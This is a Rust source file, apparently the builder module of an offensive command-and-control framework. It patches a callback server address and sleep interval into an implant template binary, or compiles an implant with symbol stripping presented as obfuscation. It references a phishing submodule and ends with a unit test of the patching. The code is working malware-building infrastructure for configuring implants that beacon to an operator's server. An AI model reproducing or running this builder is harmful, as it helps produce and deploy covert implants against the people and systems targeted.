use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::process::Command;
use tracing::{info, error};

pub mod phishing;

const CONFIG_MAGIC: &[u8] = b"WRAITH_CONFIG_BLOCK";

pub struct Builder;

impl Builder {
    /// Patches an existing implant template with new configuration data.
    pub fn patch_implant(
        template_path: &Path,
        output_path: &Path,
        server_addr: &str,
        sleep_interval: u64,
    ) -> anyhow::Result<()> {
        let mut data = Vec::new();
        File::open(template_path)?.read_to_end(&mut data)?;

        // Find magic signature
        let pos = data
            .windows(CONFIG_MAGIC.len())
            .position(|window| window == CONFIG_MAGIC)
            .ok_or_else(|| anyhow::anyhow!("Magic signature not found in template"))?;

        // Patch server_addr (at pos + 19)
        let addr_start = pos + CONFIG_MAGIC.len();
        let addr_bytes = server_addr.as_bytes();
        let addr_len = addr_bytes.len().min(64);

        // Clear old addr area (64 bytes)
        for i in 0..64 {
            data[addr_start + i] = 0;
        }
        // Write new addr
        data[addr_start..addr_start + addr_len].copy_from_slice(&addr_bytes[..addr_len]);

        // Patch sleep_interval (at pos + 19 + 64)
        let sleep_start = addr_start + 64;
        let sleep_bytes = sleep_interval.to_le_bytes();
        data[sleep_start..sleep_start + 8].copy_from_slice(&sleep_bytes);

        // Ensure output directory exists
        if let Some(parent) = output_path.parent() {
            std::fs::create_dir_all(parent)?;
        }

        File::create(output_path)?.write_all(&data)?;
        info!("Successfully patched implant: {:?}", output_path);

        Ok(())
    }

    /// Compiles a fresh implant from source with specific features and obfuscation.
    pub fn compile_implant(
        source_dir: &Path,
        output_path: &Path,
        server_addr: &str,
        features: &[&str],
        obfuscate: bool,
    ) -> anyhow::Result<()> {
        info!("Starting implant compilation for: {:?}", server_addr);

        let mut cmd = Command::new("cargo");
        cmd.arg("build")
            .arg("--release")
            .arg("--manifest-path")
            .arg(source_dir.join("Cargo.toml"))
            .env("WRAITH_SERVER_ADDR", server_addr);

        if !features.is_empty() {
            cmd.arg("--features").arg(features.join(","));
        }

        if obfuscate {
            info!("Applying build-time obfuscation flags...");
            // Statically link CRT and strip symbols
            cmd.env("RUSTFLAGS", "-C target-feature=+crt-static -C panic=abort -C link-arg=-s");
        }

        let status = cmd.status()?;

        if !status.success() {
            error!("Compilation failed for {:?}", server_addr);
            return Err(anyhow::anyhow!("Compilation failed with status: {}", status));
        }

        // Find the compiled artifact (binary name should match package name in Cargo.toml)
        let artifact = source_dir.join("target/release/spectre-implant"); 
        
        if artifact.exists() {
            if let Some(parent) = output_path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            std::fs::copy(&artifact, output_path)?;
            info!("Implant compiled and moved to: {:?}", output_path);
            Ok(())
        } else {
            error!("Artifact not found at {:?}", artifact);
            Err(anyhow::anyhow!("Artifact not found after build"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::tempdir;

    #[test]
    fn test_patch_implant_logic() {
        let dir = tempdir().unwrap();
        let template_path = dir.path().join("template.bin");
        let output_path = dir.path().join("output.bin");

        // Create mock template
        let mut template_data = vec![0u8; 256];
        let magic_pos = 50;
        template_data[magic_pos..magic_pos + CONFIG_MAGIC.len()].copy_from_slice(CONFIG_MAGIC);
        
        let mut file = File::create(&template_path).unwrap();
        file.write_all(&template_data).unwrap();

        // Patch it
        let server_addr = "192.168.1.100";
        let sleep_interval = 30;
        Builder::patch_implant(&template_path, &output_path, server_addr, sleep_interval).unwrap();

        // Verify
        let mut patched_data = Vec::new();
        File::open(&output_path).unwrap().read_to_end(&mut patched_data).unwrap();

        let addr_start = magic_pos + CONFIG_MAGIC.len();
        let extracted_addr = std::str::from_utf8(&patched_data[addr_start..addr_start + server_addr.len()]).unwrap();
        assert_eq!(extracted_addr, server_addr);

        let sleep_start = addr_start + 64;
        let extracted_sleep = u64::from_le_bytes(patched_data[sleep_start..sleep_start + 8].try_into().unwrap());
        assert_eq!(extracted_sleep, sleep_interval);
    }
}